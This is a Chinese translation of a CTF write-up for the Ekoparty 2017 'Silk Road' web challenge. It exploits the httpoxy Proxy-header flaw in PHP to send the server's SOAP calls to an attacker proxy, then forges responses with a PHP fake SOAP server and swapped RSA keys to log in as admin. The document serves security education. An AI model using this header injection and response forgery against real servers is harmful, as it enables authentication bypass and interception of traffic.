---
title: 'Ekoparty 2017: 丝绸之路（译）'
date: 2019-04-28T14:00:32+08:00
categories: ['blog']
tags: ['codisec CTF']
description: '关于，codisec.com CTF 团队博客的中文翻译，其中有对挑战的思考与解决过程'
css:
  [
    '/css/main.css',
    '/css/stylesheet.css',
    'https://codisec.com/wp-content/themes/codisec-strappress/style.css?ver=3.3.6',
  ]
series: 'Codisec.com 的 CTF团队博客 - 中文翻译'
draft: false
---

<style>
body{
    background-color: #272b30;
    color:#f9f1f1;
    font-size:1.1em;
}

a {
  color:#f1851a;
}

pre {
    background-color: #272b30;
    font-weight: 500;
    font-size: 1rem;
}

p {
    color: #c8c8c8;
}

li code,
p code {
    background-color: rgb(34, 40, 42) !important;
    color: #f1851a;
}
div.inner {
    background-color: #272b30;
}
</style>

## 博文来源

> [源文](https://codisec.com/ekoparty-2017-silk-road/) ：2017 9-21 ，作者：[Krzysztof Stopczański](https://codisec.com/author/krzysztof-stopczanski/)

CTF：EKOPARTY 2017
积分：496
类别：网络

## 描述

> “我们永远不会再犯同样的错误，我们向你挑战，来吧，阅读我们的信息，看看你能不能获得一些 BTC！” - DPR
>
> <https://silkroadzpvwzxxv.onion/>

在此网络挑战中，我们在 TOR 网络中，展示了一个网站。要访问它，我们可以使用[Tor 浏览器](https://www.torproject.org/projects/torbrowser.html.en)，并使用像 curl 这样的命令行工具 torify，但 Tor 网络专用：

```bash
torify curl -v -k "https://silkroadzpvwzxxv.onion/"
```

该网站包含两个页面：

- 1）登录面板：

<img src="https://codisec.com/wp-content/uploads/2017/09/pic1-1024x560.png" alt="login">

- 2）在`/register`的注册面板，结果发现是不能用的...

<img src="https://codisec.com/wp-content/uploads/2017/09/pic2-1024x560.png" alt="register">

测试 SQL 注入等常见漏洞，并没有带来任何用处。
让我们来看看标题：

```bash
$ torify curl -I -k "https://silkroadzpvwzxxv.onion/"
HTTP/1.1 200 OK
Date: Mon, 18 Sep 2017 11:10:02 GMT
Server: Apache
Set-Cookie: PHPSESSID=rsg6p15vnm7quglb9kte9e9sb0; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
X-Powered-By: PHP/7.0.8
Content-Type: text/html; charset=UTF-8
```

这里有趣的是， PHP 的这个版本，让我们试着找一些漏洞。
在 Google 中搜索 php 7.0.8 漏洞，会让我们看到一些非常有趣的内容：
<http://www.securiteam.com/securitynews/5YP321PJQC.html>

有关此漏洞的更多信息
<https://httpoxy.org/>

快速测试：

```bash
$ torify curl -v -k "https://silkroadzpvwzxxv.onion/" -H "Proxy: google.com"
…
HTTP/1.0 500 Internal Server Error
```

掌声！我们崩溃了应用程序！

现在让我们使用 Tinyproxy 设置 amazon 实例，并将其设置为，把流量重定向到本地 Apache 服务器。请求使用了 HTTPS 协议，因此我们还需要一个域名（由[No-IP](https://www.noip.com/)免费提供）和 SSL 证书（[Let’s Encrypt](http://www.letsencrypt.org)上也是免费的）

成功设置我们的服务器后，让我们看看，正在发送的请求：

```bash
$ torify curl -k "https://silkroadzpvwzxxv.onion/" -H "Proxy: ourserver.hopto.org"
```

现在，我们可以找找我们服务器上的 `/var/log/apache2/access.log` ，并查看：

```
127.0.0.1 - - [18/Sep/2017:11:39:29 +0000] "POST /d90cdc7988b15060c1896126cee2eae9/hiddenservice_ws.php HTTP/1.1" 404 3750 "-" "PHP-SOAP/7.0.22-0ubuntu0.17.04.1"
```

`/d90cdc7988b15060c1896126cee2eae9/hiddenservice_ws.php` 是挑战网站中的有效路径，但是当使用 `GET` 调用它时，它只返回一个空页面。我们现在创建一个文件 `/d90cdc7988b15060c1896126cee2eae9/hiddenservice_ws.php`，在我们的网络服务器中，看看来自 挑战服务器的请求是什么：

```php
<?php
$req_dump = '';
$headers = getallheaders();

foreach($headers as $key => $val)
{
	$req_dump.= "$key : $val \n";
}

$req_dump.= "\n" . print_r(file_get_contents('php://input') , TRUE);
$fp = fopen('request.log', 'a');
fwrite($fp, $req_dump);
fclose($fp);
?>
```

再次使用 `Proxy` 标头发出请求后，我们可以在 `request.log` 中看到请求的内容：

```bash
Host : hiddenservicehost
Connection : close
User-Agent : PHP-SOAP/7.0.22-0ubuntu0.17.04.1
Content-Type : text/xml; charset=utf-8
SOAPAction : "https://hiddenservicehost/d90cdc7988b15060c1896126cee2eae9/getCaptchaWord"
Content-Length : 655

<?xml version="1.0" encoding="UTF-8"?>
<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ns1="https://hiddenservicehost/d90cdc7988b15060c1896126cee2eae9/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
  <SOAP-ENV:Body>
    <ns1:getCaptchaWord>
      <guid xsi:type="xsd:string">6FF45265-5073-8C1B-1BE4-8DD77E546EE0</guid>
      <IP xsi:type="xsd:string">127.0.0.1</IP>
      <length xsi:type="xsd:int">6</length>
    </ns1:getCaptchaWord>
  </SOAP-ENV:Body>
</SOAP-ENV:Envelope>
```

结果发现，`hiddenservice_ws.php` 提供的是 SOAP API，查询本身用于生成验证字。有趣的事实 - 最初的丝绸之路，是被泄漏的验证码追踪到的（至少 FBI 声称是这样的），更多关于它：<https://krebsonsecurity.com/2014/09/dread-pirate-sunk-by-leaky-captcha/> - 很好的 Ekoparty 尝试;）。
现在有了我们的代理黑客，我们可以：

- 查看服务器查询，
- 将有效查询，发送到真实 API，
- 用我们自己的响应，改变了响应。

知道这一点后，我们可以尝试登录该服务。将上述请求发送到真正的 `hiddenservice_ws.php`，会返回以下输出：

```bash
$ torify curl -k "https://silkroadzpvwzxxv.onion/d90cdc7988b15060c1896126cee2eae9/hiddenservice_ws.php" -H "Host: hiddenservicehost" -H "Content-Type: text/xml; charset=utf-8" -H "SOAPAction: https://hiddenservicehost/d90cdc7988b15060c1896126cee2eae9/getCaptchaWord" --data @data.xml

<?xml version="1.0" encoding="UTF-8"?>
<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ns1="http://localhost/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
  <SOAP-ENV:Body>
    <ns1:getCaptchaWordResponse>
      <return xsi:type="xsd:string">wsjnDR</return>
    </ns1:getCaptchaWordResponse>
  </SOAP-ENV:Body>
</SOAP-ENV:Envelope>
```

现在，让我们改变我们的脚本假装成一个服务器，并让它将这个响应发回去：

> 假的 SOAP 服务器 – part 1

```php
<?php
$input = print_r(file_get_contents('php://input') , TRUE);
$fp = fopen('request.log', 'a');
fwrite($fp, $input);
fclose($fp);
header('Content-Type: text/xml; charset=utf-8');

if (strstr($input, 'getCaptchaWord') !== False)
{
?>
<?xmlversion = "1.0"encoding = "UTF-8" ?>
<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ns1="http://localhost/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><SOAP-ENV:Body><ns1:getCaptchaWordResponse><return xsi:type="xsd:string">wsjnDR</return></ns1:getCaptchaWordResponse></SOAP-ENV:Body></SOAP-ENV:Envelope>
<?php
}
?>
```

我们得到的下一个请求：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ns1="https://hiddenservicehost/d90cdc7988b15060c1896126cee2eae9/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
  <SOAP-ENV:Body>
    <ns1:checkCaptchaWord>
      <guid xsi:nil="true"/>
      <word xsi:type="xsd:string">123456</word>
    </ns1:checkCaptchaWord>
  </SOAP-ENV:Body>
</SOAP-ENV:Envelope>
```

再来 —— 我们将它发送到真正的服务器，并检查响应：

```bash
$ torify curl -k "https://silkroadzpvwzxxv.onion/d90cdc7988b15060c1896126cee2eae9/hiddenservice_ws.php" -H "Host: hiddenservicehost" -H "Content-Type: text/xml; charset=utf-8" -H "SOAPAction: https://hiddenservicehost/d90cdc7988b15060c1896126cee2eae9/getCaptchaWord" --data @data.xml

<?xml version="1.0" encoding="UTF-8"?>
<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ns1="http://localhost/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
  <SOAP-ENV:Body>
    <ns1:checkCaptchaWordResponse>
      <return xsi:type="xsd:boolean">false</return>
    </ns1:checkCaptchaWordResponse>
  </SOAP-ENV:Body>
</SOAP-ENV:Envelope>
```

让我们稍微改变一下 —— 把

```xml
<return xsi:type="xsd:boolean">false</return>
```

替换成：

```xml
<return xsi:type="xsd:boolean">true</return>
```

因此，我们总是通过验证码验证，并将其放入我们的假 SOAP 服务器中：

> 假的 SOAP 服务器 – part 2

```php
else if(strstr($input, 'checkCaptchaWord') !== False)
{
?>
<?xml version="1.0" encoding="UTF-8"?>
...<return xsi:type="xsd:boolean">true</return>...
```

我们假服务器，从 Web 服务器收到的下一个请求是：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ns1="https://hiddenservicehost/d90cdc7988b15060c1896126cee2eae9/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
  <SOAP-ENV:Body>
    <ns1:getPublicKey>
      <format xsi:type="xsd:string">PEM</format>
    </ns1:getPublicKey>
  </SOAP-ENV:Body>
</SOAP-ENV:Envelope>
```

这就是对公钥的请求 —— 似乎会进行一些加密。让我们从真正的 SOAP 服务器，下载密钥，并将其保存，以供以后使用：

```
…
<ns1:getPublicKeyResponse><return xsi:type="xsd:string">
-----BEGIN PUBLIC KEY-----
MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAw3vXUQ0nUkDejmMAamcT
fsEAgiqy05tZzP7IIrjnWIrA5acJqxctGLDAq36+mHSgAiuPeH2cZFQ3930P3V/V
AZCpwM45FqbHn/C0cqt5aV7GbjJQBnpBJj0fNMChvv2XWOWUzS+MABgj8ViZ/6p8
XJIo0HfTaPP5X8ASmRfG0XEpTI8/GKnDcDK3iv+zfleWzBSZeitkD+KJxVU3Wkni
CijMadbAXzdEm3H4Mw32Yzv92oU3lyMmboh9p24aiwSQctRDm9/N4hRNC7ZTM5FG
TSoTtCxcfAT3SU3wI2erGIDdHxnXOp3wGbxC+oM2LBOUt731SR4zo0StrQu4Sl8r
uUo92vUeoJ/nKAfEcN84CP1n5BIx58JWu8rU8V3nZOM+YIpQFS3HgdGUszWcChtv
yH4I5337YcuNuBiGyQo46YY1KR5WiXWryz1blpXzyVvELlUoz+o2BsAO/bwaFtaW
JTejXqBUGG9NVLmk239UHU3+NxghgH8QrrQV9bWkX25IDNaSVsllzO53hv/Kn2rd
AVb4qfonC+J9YFkoTQ4sIwN+Jtv+0AkNuDAlp0Zo3rFW9+vhs4bl6CGrP+Llq72h
zAzGZgHXmB8zTXljc2yUyARY2kMyTHYa77uW2v8tyFUn8YxIrgiXwAPqDP/oQILB
+okQlWmlmCfYEnRlQVA44HECAwEAAQ==
-----END PUBLIC KEY-----
```

现在，让我们为与网页的伪造通信，生成自己的密钥对：

```bash
openssl genpkey -algorithm RSA -out my_key/private_key.pem -pkeyopt rsa_keygen_bits:2048
openssl rsa -pubout -in my_key/private_key.pem -out my_key/public_key.pem
```

让我们继续创建对， `getPublicKey` 的假响应，这次使用我们自己的密钥，并继续进行身份验证过程：

> 假的 SOAP 服务器 – part 3

```php
else if(strstr($input, 'getPublicKey') !== False)
{
?>
…
<ns1:getPublicKeyResponse><return xsi:type="xsd:string">-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAttk+ShvJl8x+Gh
…
```

下一个请求：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ns1="https://hiddenservicehost/d90cdc7988b15060c1896126cee2eae9/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
  <SOAP-ENV:Body>
    <ns1:checkCredentials>
      <username xsi:type="xsd:string">ez8cHs/i4U28hMZV1yJnnJtaDbS7H89mJKPXIe8iIJevy2bIVguYP6CpNNPXU3xPY3Jmz/KccsN1Q2Am/rmh2yiQGqHnE69ljocuNSmTYxf0S5nLODYFFlEkK4SnUhbNV1fOFnQkq9xKFhYjNCr0+aMArSxLdi3GWGxY3Ri6ozlKZ6UHL5wo50JomBYWBRPP4ZiOGoh7PcjOTQhccj/aqT5QkJOKqraPAHMSgVopykIbkOZZK2K7UEI4NtzSN/S9ZbmtmZqlMKevSXzQVnt4cx9HNE4pDam784pGjcbc4iTCWErTniUlTMmgBcUeGPv4sMuIqRPwsS6tIdynN0RpvA==</username>
      <password xsi:type="xsd:string">BtotLqmqRnQEZ5zHOBNksmpLnKX2O/FXYMahEBy0+HKkoxnBoPiZVl9HyMWxph4aRup/hjFFtB1wJI09xHR/MRr4mxQS7KRhiiRTNTAI9HpWVmFY6tBufeDhylP98M6Aukk7cjHM6dy0vJ0Dc5qqRGHhmLWqdc98xZAxdYlLuLs8YZSmWIMVUp+WM2jhHi2VK67Vr/v/fyz+GYvdKgvGZfpIRPCxw4D9NBaCecNqMkICggxsBnzPR2AXA6z3CK8mC6McCEz+B6YoU6n3ehIrHLd0oLNDiQ8ZPfKnDQdJaP/48inrF/uH2qnSoJbV8ozLNecVH22QUMPQ3Ve+FU1KkQ==</password>
      <return_format xsi:type="xsd:string">hYgDX7iTGO9PQ19YvgSkqw8lbkKfSDlKZaQD6R7QaUgW9GtcsaZMhO8NRoZ85AVnE/igOo4ck9BG9U/l6aw14Lw75/Kg13+zhb4NihVF+KCdJUgLKuZM9wv4Y0f5xtt9QnBoHxJZzG9qsRwJiZ5t3pBeV2u3M9wX0grUcY9KRaTioUqaSLkhZL7hnxjlB5sQWALG6/xLDU9K0/Iv3ETJ+iev3UPcBbpVYIL27ewg/p35jAUGs2Wd8/UJab0l0xfdMvavpmIT21v81tyUf9uDrGFMD0D4g8qNpbcazconekMs5Ut7WCWZHO81leNJhVUyBMWw+0IaSGPJI8RGbZhvcw==</return_format>
    </ns1:checkCredentials>
  </SOAP-ENV:Body>
</SOAP-ENV:Envelope>
```

这些字符串是 base64 编码的，解码后，看起来像一些随机数据 —— 让我们尝试用我们的私钥，解密它：

```bash
$ base64 -d <<< "ez8cHs/i4U28hMZV1..." | openssl rsautl -decrypt -inkey my_key/private_key.pem
admin

$ base64 -d <<< "BtotLqmqRnQE..." | openssl rsautl -decrypt -inkey my_key/private_key.pem
admin
$ base64 -d <<< "hYgDX7iTGO9PQ19Yv..." | openssl rsautl -decrypt -inkey my_key/private_key.pem
#LEVEL#|#ACTIVE#|#USERNAME#
```

对 SOAP API 发送查询，会向我们显示正确的响应格式：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ns1="http://localhost/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
  <SOAP-ENV:Body>
    <ns1:checkCredentialsResponse>
      <return xsi:type="xsd:string">brAeciqgRwohqYYGxutpv8Cu4x35VWi0EjMaTYpaN...</return>
    </ns1:checkCredentialsResponse>
  </SOAP-ENV:Body>
</SOAP-ENV:Envelope>
```

我们假设数据是使用 SOAP API 的私钥加密的，并且网页使用从 API 接收到的公钥，进行解密。让我们尝试一下，按照上面收到的格式，编写我们的响应，然后使用我们的私钥，对其进行加密：

```bash
$ echo -ne "100|true|admin" | openssl rsautl -sign -inkey private_key.pem | base64
XiX4AaisveD9KlBoNaRpkgSEYpp48U60kLZx5RWHH3+i68cupt0r5O7MEKSNuYEi97cuKs7+v12X
wPay2FKGR4J9icuPEcvaJVZT8j0ptMvM9i6sFnLsGD93oXIntyYLDSNUvqzQAP7y0fR2hZHtHQCD
wwtQt7qwJZuJPobMNXcSK8jcXmV5EqF0JvYKlwm5aszTYP5/5mo0hGE2FMuNv/5CgXQcI2XocyDO
guGd9fALzwB3Fxt6K7PLpoJ2pg4Ln99t0EWfGxXqYzCqLi8Jx8HFCl4dFVSJ37IuqmUPvl1brTkD
SrD0t20YtF6awDhnAYTJ9HQcMuvcMLW6XpQcIA==
```

我们已经构建了，对我们的假 SOAP 服务器的另一个正确响应，让我们将其添加到脚本中：

> 假的 SOAP 服务器 – part 4

```php
<?php
else if (strstr($input, 'checkCredentials') !== False)
{
?>
<?xml version="1.0" encoding="UTF-8"?>
<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ns1="http://localhost/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
  <SOAP-ENV:Body>
    <ns1:checkCredentialsResponse>
      <return xsi:type="xsd:string">axB28P6hYR+u275oPz...</return>
    </ns1:checkCredentialsResponse>
  </SOAP-ENV:Body>
</SOAP-ENV:Envelope>
```

我们的伪 API，得到的下一个请求：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ns1="https://hiddenservicehost/d90cdc7988b15060c1896126cee2eae9/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
  <SOAP-ENV:Body>
    <ns1:getUserDetails>
      <username xsi:type="xsd:string">e/5P1tjauBTvtQWus1+1ijGjI/PMA40JVLMe//RBQukNClchs71NbJFfeMav2/ihPu6BP7JhAqJqTPz3FVUjdazFNcekFvydA1kWj8thI8XbeY0jC7MRNLOnjeWqbK7aOehHTWRirvoq7yD1FTjz/YKPR0ou6FoOpvCngZy3xjaQ08wEH2hEs6AadADvB8yLDPgzdncaTCh9ZmX2WfdHIgHIuZkrtnBTE6iKaup44UF2u8VxhoraaHnNfSHlakd3sD8W50iZgksA+cqb5kguOqVAikUJqKs3Xv0G4UojIiFjayOwWCTP21uHn6yOM/Qy8VnAzhgjUWYW53LxWG21FA==</username>
    </ns1:getUserDetails>
  </SOAP-ENV:Body>
</SOAP-ENV:Envelope>
```

很好–似乎我们通过了身份验证。对真实 API 发送查询，并带上使用服务器公钥加密的用户名，我们将看到另一种正确的响应格式：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ns1="https://hiddenservicehost/d90cdc7988b15060c1896126cee2eae9/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
  <SOAP-ENV:Body>
    <ns1:getUserDetails>
      <username xsi:type="xsd:string">e/5P1tjauBTvtQWus1+1ijGjI/PMA40JVLMe//RBQukNClchs71NbJFfeMav2/ihPu6BP7JhAqJqTPz3FVUjdazFNcekFvydA1kWj8thI8XbeY0jC7MRNLOnjeWqbK7aOehHTWRirvoq7yD1FTjz/YKPR0ou6FoOpvCngZy3xjaQ08wEH2hEs6AadADvB8yLDPgzdncaTCh9ZmX2WfdHIgHIuZkrtnBTE6iKaup44UF2u8VxhoraaHnNfSHlakd3sD8W50iZgksA+cqb5kguOqVAikUJqKs3Xv0G4UojIiFjayOwWCTP21uHn6yOM/Qy8VnAzhgjUWYW53LxWG21FA==</username>
    </ns1:getUserDetails>
  </SOAP-ENV:Body>
</SOAP-ENV:Envelope>
```

使用服务器的公钥，解密消息可以得到：

```
a:3:{s:6:"orders";s:1:"0";s:3:"btc";s:1:"0";s:8:"messages";s:1:"0";}
```

这使用了标准 php `serialize` 方法，是一个包含用户详细信息的序列化结构。

再来 —— 让我们用我们的私钥加密它，并为我们的假 SOAP 脚本，添加另一个条件。最后一个请求和 …

```bash
$ torify curl -v -k "https://silkroadzpvwzxxv.onion/"
HTTP/1.1 200 OK
Date: Mon, 18 Sep 2017 11:10:02 GMT
Server: Apache
Set-Cookie: PHPSESSID=rsg6p15vnm7quglb9kte9e9sb0; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Location: /
Pragma: no-cache
X-Powered-By: PHP/7.0.8
Content-Type: text/html; charset=UTF-8

…
```

没有新的 SOAP 请求，我们收到了 `Location`标头，告诉我们刷新页面。让我们在浏览器中，设置接收到的 `PHPSESSID` cookie，并打开挑战的网页 —— 这次没有 `Proxy`标头，因此剩余的通信将调用真正的 API 。很好，我们以管理员身份登录！很遗憾，我们看不到任何旗帜。我们花了一些时间，尝试更改 `getUserDetails` 响应，但解决方案要简单得多 —— 我们只需要以 `DPR` 用户身份登录（我们从挑战描述中，获取，它是原丝绸之路创始人的名字），并在 `checkCredentialsResponse` 中设置高级别（10000000）。然后，瞧 —— 得分旗帜出现在了用户消息中：
`EKO{dread_by_p0xy}`